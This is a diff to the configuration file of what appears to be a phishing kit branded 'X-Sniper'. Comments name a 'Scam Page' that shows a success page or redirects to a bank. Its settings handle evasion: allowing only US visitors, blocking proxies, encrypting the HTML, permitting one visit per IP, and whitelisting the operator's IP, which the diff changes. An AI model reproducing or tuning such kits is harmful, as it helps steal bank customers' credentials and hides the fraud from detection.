@@ -36,14 +36,14 @@ Copyright all Reserved to X-Sniper Page
 	// ================================= //
 		$countryBlock = "true";  // If You Want To Access CCountry You Choose To Go Scam Page 
 		$allowdCountry = "us";  // write one Country
-		$yourIPCountry = "107.150.19.195"; // Allow Your Ip To Enter from any Country 
+		$yourIPCountry = "185.246.128.82"; // Allow Your Ip To Enter from any Country 
 	// ================================= //
 		$blockProxy = "true"; 	// If you don`t want to Block Proxy false to true (Free API)
 	// ================================= //
 		$encrypt_html = "true"; // If you don`t want to encrypt pages hange from true to false
 	// ================================= //
 		$accessOneTimeIp = "true"; // Access one Time by ip
-		$yourIPAceess = "185.246.128.82 "; // Allow Your Ip To Enter More than One Time
+		$yourIPAceess = "185.246.128.82"; // Allow Your Ip To Enter More than One Time
 	// ========= Pages =========== //
 		$Block_page = "false"; //Show Block Page 2nd page => true / false
 		$success_page = "true";  //Show Success Page or Redirect to Bank    => true Or false
